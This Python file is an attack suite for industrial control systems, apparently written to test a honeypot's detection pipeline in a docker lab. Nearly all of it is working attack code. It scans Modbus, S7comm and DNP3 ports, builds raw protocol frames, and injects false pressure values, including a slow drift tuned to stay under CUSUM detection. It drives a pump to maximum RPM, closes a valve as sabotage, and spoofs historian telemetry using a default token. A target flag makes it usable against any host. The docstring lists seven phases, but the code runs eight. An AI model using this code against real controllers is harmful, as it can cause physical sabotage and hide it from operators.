"""
ICS Honeypot Attack Suite — Full Kill Chain Demo
=================================================
Covers all 7 attack phases against the ICS honeypot:
  Phase 1: Reconnaissance       (nmap port/service scan)
  Phase 2: Information Gathering (Modbus read-coils / S7 banner)
  Phase 3: Vulnerability Scan   (protocol fingerprinting + banner grab)
  Phase 4: Exploit              (Modbus FC6 forced sensor write)
  Phase 5: Payload Delivery      (sustained pressure manipulation)
  Phase 6: Lateral Movement      (pivot from Modbus → S7 → DNP3)
  Phase 7: Privilege Escalation  (write to actuator control registers)

Usage (from attacker_node bash):
    python3 attack_suite.py [--phase N] [--target HOST]

    --phase 0   → run ALL phases (full kill chain)
    --phase 1   → only Phase 1 (recon)
    ...
    --phase 7   → only Phase 7 (privesc)
    --target    → override default target (default: plc_simulator)
"""

import sys
import os
import socket
import struct
import time
import argparse

# ── Optional dependencies (graceful degradation) ──────────────────────────────
try:
    from pymodbus.client import ModbusTcpClient
    HAS_MODBUS = True
except ImportError:
    HAS_MODBUS = False
    print("[WARN] pymodbus not installed — Modbus phases disabled")

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Targets ────────────────────────────────────────────────────────────────────
DEFAULT_TARGETS = {
    "modbus": os.environ.get("MODBUS_TARGET", "plc_simulator"),
    "s7":     os.environ.get("S7_TARGET",     "ics_s7_plc"),
    "dnp3":   os.environ.get("DNP3_TARGET",   "ics_dnp3"),
}

MODBUS_PORT = 502
S7_PORT     = 102
DNP3_PORT   = 20000

# Modbus register map
REG_PRESSURE    = 100
REG_FLOW_RATE   = 101
REG_TEMPERATURE = 102
REG_PUMP_RPM    = 103
REG_ACTUATOR_RPM   = 200
REG_VALVE_PERCENT  = 201
REG_VALVE_TOGGLE   = 202

SEPARATOR = "\n" + "=" * 60

# ── Utility ────────────────────────────────────────────────────────────────────
def banner(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

def result(label: str, value):
    print(f"  [+] {label}: {value}")

def warn(msg: str):
    print(f"  [!] {msg}")

def sleep_with_label(seconds: float, label: str = ""):
    desc = f" ({label})" if label else ""
    print(f"  ... waiting {seconds}s{desc}")
    time.sleep(seconds)

# ─────────────────────────────────────────────────────────────────────────────
# Phase 1 — Reconnaissance
# ─────────────────────────────────────────────────────────────────────────────
def phase1_recon(targets: dict):
    banner("PHASE 1: RECONNAISSANCE — Port & Service Discovery")
    print("  Strategy: TCP connect scan (-sT) with -n (no DNS) for speed")
    print("  Ports targeted: 502 (Modbus), 102 (S7comm), 20000 (DNP3)")
    print()

    for name, host in [("Modbus PLC", targets["modbus"]),
                        ("S7comm PLC", targets["s7"]),
                        ("DNP3 RTU",   targets["dnp3"])]:
        _tcp_connect_scan(name, host, [MODBUS_PORT, S7_PORT, DNP3_PORT])

    # nmap is available in the container — use -n and -sT (no root needed)
    print("\n  Running nmap TCP connect scan (-sT -n) …")
    modbus_host = targets["modbus"]
    cmd = (f"nmap -sT -n -p {MODBUS_PORT},{S7_PORT},{DNP3_PORT} "
           f"--open -T4 {modbus_host} 2>&1")
    print(f"  CMD: {cmd}")
    ret = os.system(cmd)
    if ret != 0:
        warn("nmap not found or scan failed — TCP probes above are sufficient")

def _tcp_connect_scan(label: str, host: str, ports: list):
    print(f"  Scanning {label} ({host}) …")
    for port in ports:
        try:
            s = socket.create_connection((host, port), timeout=2)
            s.close()
            result(f"  TCP {port}", "OPEN")
        except Exception:
            print(f"  [-] TCP {port}: closed/filtered")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2 — Information Gathering
# ─────────────────────────────────────────────────────────────────────────────
def phase2_info_gathering(targets: dict):
    banner("PHASE 2: INFORMATION GATHERING — Read Sensor Registers")
    host = targets["modbus"]
    if not HAS_MODBUS:
        warn("pymodbus not available — skipping Modbus read")
        return

    client = ModbusTcpClient(host, port=MODBUS_PORT)
    try:
        if not client.connect():
            warn(f"Cannot connect to {host}:{MODBUS_PORT}")
            return
        result("Connected to Modbus PLC", f"{host}:{MODBUS_PORT}")

        # Read all sensor holding registers
        rr = client.read_holding_registers(REG_PRESSURE, count=4)
        if not rr.isError():
            result("Pressure (reg 100)",    f"{rr.registers[0]} PSI")
            result("Flow Rate (reg 101)",   f"{rr.registers[1] / 10.0:.1f} L/s")
            result("Temperature (reg 102)", f"{rr.registers[2]} °C")
            result("Pump RPM (reg 103)",    f"{rr.registers[3]} RPM")
        else:
            warn(f"Modbus read error: {rr}")

        # Try reading actuator registers (potential control surface)
        rr2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=3)
        if not rr2.isError():
            result("Actuator RPM (reg 200)", rr2.registers[0])
            result("Valve % (reg 201)",      rr2.registers[1])
            result("Valve Toggle (reg 202)", rr2.registers[2])
        else:
            print("  [-] Actuator registers 200-202: no response (expected for sensor-only block)")
    finally:
        client.close()

    # S7 banner grab
    print()
    print("  S7comm banner grab …")
    _s7_banner_grab(targets["s7"])


def _s7_banner_grab(host: str):
    COTP_CR = bytes([
        0x03, 0x00, 0x00, 0x16,
        0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xC1, 0x02, 0x01, 0x00,
        0xC2, 0x02, 0x01, 0x02,
        0xC0, 0x01, 0x0A,
    ])
    try:
        s = socket.create_connection((host, S7_PORT), timeout=4)
        s.sendall(COTP_CR)
        time.sleep(0.3)
        resp = s.recv(256)
        s.close()
        if len(resp) >= 6 and resp[5] == 0xD0:
            result("S7comm target", f"{host}:{S7_PORT} — COTP CC confirmed (Siemens S7-300 emulated)")
        else:
            result("S7comm response", resp.hex()[:40])
    except Exception as e:
        warn(f"S7 banner error: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 3 — Vulnerability Scan / Protocol Fingerprinting
# ─────────────────────────────────────────────────────────────────────────────
def phase3_vuln_scan(targets: dict):
    banner("PHASE 3: VULNERABILITY SCAN — Protocol Fingerprinting")

    # Modbus: probe function codes to determine supported operations
    host = targets["modbus"]
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        if client.connect():
            print("  Probing Modbus function codes …")
            # FC3 — Read Holding Registers (safe)
            r = client.read_holding_registers(0, count=1)
            result("FC3 (Read Holding Regs)",  "SUPPORTED" if not r.isError() else "DENIED")
            # FC6 — Write Single Register (DANGEROUS)
            # Write a harmless value to register 200 (RPM = current value)
            r2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=1)
            safe_rpm = r2.registers[0] if not r2.isError() else 1200
            wr = client.write_register(REG_ACTUATOR_RPM, value=safe_rpm)
            result("FC6 (Write Single Reg)",   "SUPPORTED — VULNERABLE!" if not wr.isError() else "DENIED")
            # FC16 — Write Multiple Registers
            wm = client.write_registers(REG_ACTUATOR_RPM, values=[safe_rpm])
            result("FC16 (Write Multiple Regs)", "SUPPORTED" if not wm.isError() else "DENIED")
            client.close()
        else:
            warn(f"Cannot connect to Modbus {host}:{MODBUS_PORT}")
    else:
        warn("pymodbus not available — skipping Modbus fingerprint")

    # DNP3 RESET_LINK_STATES probe
    print()
    print("  DNP3 RESET_LINK_STATES probe …")
    _dnp3_reset_probe(targets["dnp3"])

    # S7 full setup handshake
    print()
    print("  S7comm Setup Communication probe …")
    _s7_full_handshake(targets["s7"])


def _dnp3_crc(data: bytes) -> int:
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
        table.append(crc)
    crc = 0
    for b in data:
        crc = table[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return (~crc) & 0xFFFF


def _dnp3_reset_probe(host: str):
    raw = bytes([0x05, 0x64, 0x05, 0x40, 0x01, 0x00, 0x03, 0x00])
    frame = raw + struct.pack('<H', _dnp3_crc(raw))
    try:
        s = socket.create_connection((host, DNP3_PORT), timeout=4)
        s.sendall(frame)
        time.sleep(0.4)
        resp = s.recv(256)
        s.close()
        if len(resp) >= 10 and resp[0] == 0x05 and resp[1] == 0x64:
            result("DNP3 target", f"{host}:{DNP3_PORT} — ACK received (outstation active)")
        else:
            result("DNP3 response", resp.hex()[:40])
    except Exception as e:
        warn(f"DNP3 probe error: {e}")


def _s7_full_handshake(host: str):
    COTP_CR = bytes([
        0x03, 0x00, 0x00, 0x16,
        0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xC1, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x01, 0x02,
        0xC0, 0x01, 0x0A,
    ])
    S7_SETUP = bytes([
        0x03, 0x00, 0x00, 0x19,
        0x02, 0xF0, 0x80,
        0x32, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x00,
        0xF0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x03, 0xC0,
    ])
    try:
        s = socket.create_connection((host, S7_PORT), timeout=4)
        s.sendall(COTP_CR)
        time.sleep(0.3)
        r1 = s.recv(256)
        if len(r1) >= 6 and r1[5] == 0xD0:
            s.sendall(S7_SETUP)
            time.sleep(0.3)
            r2 = s.recv(256)
            if len(r2) >= 8 and r2[7] == 0x03:
                pdu = ((r2[23] << 8) | r2[24]) if len(r2) > 24 else "?"
                result("S7 handshake", f"ESTABLISHED — negotiated PDU={pdu}")
            else:
                result("S7 setup response", r2.hex()[:40])
        s.close()
    except Exception as e:
        warn(f"S7 handshake error: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 4 — Exploit (Forced Sensor Write / Semantic Injection)
# ─────────────────────────────────────────────────────────────────────────────
def phase4_exploit(targets: dict):
    banner("PHASE 4: EXPLOIT — Semantic Injection via FC6 Write")
    warn("Writing 350 PSI directly to pressure sensor register 100")
    warn("This bypasses physics — the historian will log a forced_write")
    host = targets["modbus"]
    if not HAS_MODBUS:
        warn("pymodbus not available — cannot execute this phase")
        return

    client = ModbusTcpClient(host, port=MODBUS_PORT)
    if not client.connect():
        warn(f"Cannot connect to {host}:{MODBUS_PORT}")
        return
    try:
        # Read current before
        rr = client.read_holding_registers(REG_PRESSURE, count=1)
        before = rr.registers[0] if not rr.isError() else "?"
        result("Pressure BEFORE inject", f"{before} PSI")

        # Inject
        inject_val = 350
        r = client.write_register(REG_PRESSURE, value=inject_val)
        if r.isError():
            warn(f"Write failed: {r}")
        else:
            result("Injected value", f"{inject_val} PSI to reg {REG_PRESSURE}")
            result("Expected ML response", "SEMANTIC_INJECTION alert should fire in <10s")

        sleep_with_label(2, "letting historian catch up")

        rr2 = client.read_holding_registers(REG_PRESSURE, count=1)
        after = rr2.registers[0] if not rr2.isError() else "?"
        result("Pressure AFTER inject", f"{after} PSI")
        print()
        print("  Check Grafana:")
        print("    → Pressure chart: attacker series should show spike to 350 PSI")
        print("    → ML Anomaly Status: should flip to ANOMALY")
        print("    → security_alerts measurement: SEMANTIC_INJECTION entry")
    finally:
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 5 — Payload Delivery (sustained drift manipulation)
# ─────────────────────────────────────────────────────────────────────────────
def phase5_payload(targets: dict):
    banner("PHASE 5: PAYLOAD DELIVERY — Sustained Stealth Pressure Drift")
    warn("Slowly incrementing pressure by 5 PSI every 5s over 75s (15 steps)")
    warn("Goal: trigger EWMA/CUSUM STEALTH_DRIFT_EWMA without a sudden spike")
    warn("CUSUM threshold = 65.0, slack k = 4.0 — needs sustained cumulative drift")
    host = targets["modbus"]
    if not HAS_MODBUS:
        warn("pymodbus not available — cannot execute this phase")
        return

    client = ModbusTcpClient(host, port=MODBUS_PORT)
    if not client.connect():
        warn(f"Cannot connect to {host}:{MODBUS_PORT}")
        return
    try:
        rr = client.read_holding_registers(REG_PRESSURE, count=1)
        base_pressure = rr.registers[0] if not rr.isError() else 120

        print(f"  Base pressure: {base_pressure} PSI")
        # 15 steps × 5 PSI × 5s = 75s — enough to saturate CUSUM past 65.0
        for step in range(15):
            new_pressure = base_pressure + (step + 1) * 5
            client.write_register(REG_PRESSURE, value=new_pressure)
            print(f"  Step {step+1}/15: pressure → {new_pressure} PSI  "
                  f"(+{(step+1)*5} PSI above base)")
            time.sleep(5)

        result("Payload complete", "CUSUM accumulator should exceed threshold (65.0)")
        print("  Check Grafana: security_alerts should show STEALTH_DRIFT_EWMA")
        print("  If not yet fired, wait 10-15s for next ML cycle to run.")
    finally:
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 6 — Lateral Movement (Modbus → S7 → DNP3)
# ─────────────────────────────────────────────────────────────────────────────
def phase6_lateral_movement(targets: dict):
    banner("PHASE 6: LATERAL MOVEMENT — Pivot Protocol Targets")
    print("  Pivoting from Modbus PLC → S7comm PLC → DNP3 RTU")
    print("  Each connection logs to honeypot_events / auth_attempts in InfluxDB")
    print()

    # Modbus: read sensor registers (Phase 2 recap, different focus)
    if HAS_MODBUS:
        print("  [Modbus] Establishing unauthorised read on plc_simulator …")
        client = ModbusTcpClient(targets["modbus"], port=MODBUS_PORT)
        if client.connect():
            r = client.read_holding_registers(REG_PRESSURE, count=4)
            if not r.isError():
                result("Modbus pivot read", f"P={r.registers[0]} F={r.registers[1]} T={r.registers[2]} RPM={r.registers[3]}")
            client.close()

    sleep_with_label(1, "pivoting to S7 …")

    # S7: establish connection and negotiate PDU
    print()
    print("  [S7comm] Connecting to ics_s7_plc on port 102 …")
    _s7_full_handshake(targets["s7"])

    sleep_with_label(1, "pivoting to DNP3 …")

    # DNP3: probe outstation
    print()
    print("  [DNP3] Probing ics_dnp3 outstation on port 20000 …")
    _dnp3_reset_probe(targets["dnp3"])

    print()
    result("Lateral movement", "All three protocol endpoints accessed — logged in InfluxDB")
    print("  Check honeypot_events and auth_attempts measurements in Grafana/InfluxDB")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7 — Privilege Escalation (write to actuator control registers)
# ─────────────────────────────────────────────────────────────────────────────
def phase7_privesc(targets: dict):
    banner("PHASE 7: PRIVILEGE ESCALATION — Write to Actuator Control Registers")
    warn("Escalating from sensor-read to full actuator control")
    host = targets["modbus"]
    if not HAS_MODBUS:
        warn("pymodbus not available — cannot execute this phase")
        return

    client = ModbusTcpClient(host, port=MODBUS_PORT)
    if not client.connect():
        warn(f"Cannot connect to {host}:{MODBUS_PORT}")
        return
    try:
        # Read current actuator state
        rr = client.read_holding_registers(REG_ACTUATOR_RPM, count=3)
        if not rr.isError():
            orig_rpm   = rr.registers[0]
            orig_valve = rr.registers[1]
            orig_toggle= rr.registers[2]
            result("Current RPM (reg 200)",       orig_rpm)
            result("Current Valve % (reg 201)",   orig_valve)
            result("Current Valve toggle (reg 202)", orig_toggle)
        else:
            orig_rpm, orig_valve, orig_toggle = 1200, 800, 1
            warn("Could not read actuator regs — using defaults")

        # Escalation: force pump to max RPM
        print()
        warn("Writing MAX pump RPM (3000) to reg 200 → physics engine will react")
        client.write_register(REG_ACTUATOR_RPM, value=3000)
        result("Pump RPM written", "3000 RPM (max)")
        sleep_with_label(2)

        # Force valve closed
        warn("Closing valve (reg 202 = 0) → simulates sabotage")
        client.write_register(REG_VALVE_TOGGLE, value=0)
        result("Valve toggle written", "0 (CLOSED)")
        sleep_with_label(3)

        # Restore to original values (leave system in good state for demo)
        print()
        print("  Restoring actuator to pre-attack state …")
        client.write_register(REG_ACTUATOR_RPM, value=orig_rpm)
        client.write_register(REG_VALVE_TOGGLE, value=orig_toggle)
        result("Actuators restored", f"RPM={orig_rpm} Valve={orig_toggle}")
        print()
        print("  Check Grafana: Pump RPM graph should show spike → drop → recovery")
        print("  Check InfluxDB modbus_events: FC6 writes to regs 200 and 202")
    finally:
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 8 — Replay Attack (Historian Freezing)
# ─────────────────────────────────────────────────────────────────────────────
def phase8_replay(targets: dict):
    banner("PHASE 8: REPLAY ATTACK — Historian Spoofing/Freezing")
    print("  Strategy: Inject spoofed 'normal' telemetry directly into InfluxDB")
    print("  to hide PLC state changes from the historian.")
    print("  This triggers the hmi_simulator replay detection (flat historian + moving PLC).")
    
    if not HAS_REQUESTS:
        warn("requests not available — cannot execute this phase (pip install requests)")
        return
    
    # Historian internal hostname via docker
    INFLUX_API_URL  = 'http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns'
    INFLUX_TOKEN    = os.environ.get("INFLUX_TOKEN", "supersecrettoken")
    
    headers  = {
        'Authorization': f'Token {INFLUX_TOKEN}',
        'Content-Type':  'text/plain; charset=utf-8',
    }
    
    spoof_value   = 120.0  
    print("  Injecting static 120.0 PSI as 'historian_bridge' to mimic a frozen feed...")
    success_count = 0
    for i in range(15):
        ts = time.time_ns()
        payload = f"pipeline_metrics,location=pump_station_01,source=historian_bridge pressure={spoof_value} {ts}"
        try:
            r = requests.post(INFLUX_API_URL, headers=headers, data=payload, timeout=5)
            if r.status_code == 204:
                success_count += 1
                result("Spoofed frame", f"{spoof_value} PSI (#{i+1})")
            else:
                warn(f"HTTP {r.status_code}: {r.text}")
        except Exception as e:
            warn(f"Request error: {e}")
            break
            
        time.sleep(0.1)

    result("Replay Attack", "Injection complete. If PLC state is fluctuating, Grafana will alert REPLAY_ATTACK.")


# ─────────────────────────────────────────────────────────────────────────────
# Main dispatch
# ─────────────────────────────────────────────────────────────────────────────
PHASES = {
    1: ("Reconnaissance",      phase1_recon),
    2: ("Information Gathering", phase2_info_gathering),
    3: ("Vulnerability Scan",  phase3_vuln_scan),
    4: ("Exploit",             phase4_exploit),
    5: ("Payload Delivery",    phase5_payload),
    6: ("Lateral Movement",    phase6_lateral_movement),
    7: ("Privilege Escalation", phase7_privesc),
    8: ("Replay Attack",       phase8_replay),
}

def main():
    parser = argparse.ArgumentParser(description="ICS Honeypot Attack Suite")
    parser.add_argument("--phase",  type=int, default=0,
                        help="Phase to run (1-8), 0=all (default: 0)")
    parser.add_argument("--target", type=str, default=None,
                        help="Override Modbus/S7/DNP3 host (default: from env/docker service name)")
    args = parser.parse_args()

    targets = dict(DEFAULT_TARGETS)
    if args.target:
        targets["modbus"] = args.target
        targets["s7"]     = args.target
        targets["dnp3"]   = args.target

    print("\n" + "=" * 60)
    print("  ICS HONEYPOT FULL KILL CHAIN ATTACK SUITE")
    print(f"  Targets: Modbus={targets['modbus']} S7={targets['s7']} DNP3={targets['dnp3']}")
    print("=" * 60)

    if args.phase == 0:
        print("  Running ALL phases (1-8) …")
        for n in range(1, 9):
            name, fn = PHASES[n]
            fn(targets)
            if n < 8:
                sleep_with_label(2, f"transition → Phase {n+1}")
        print(SEPARATOR)
        print("  [DONE] Full kill chain complete.")
        print("  Check Grafana (http://localhost:3000) for all logged events.")
    elif args.phase in PHASES:
        name, fn = PHASES[args.phase]
        fn(targets)
        print(SEPARATOR)
        print(f"  [DONE] Phase {args.phase}: {name} complete.")
    else:
        print(f"[ERR] Unknown phase {args.phase}. Choose 0-8.")
        sys.exit(1)


if __name__ == "__main__":
    main()
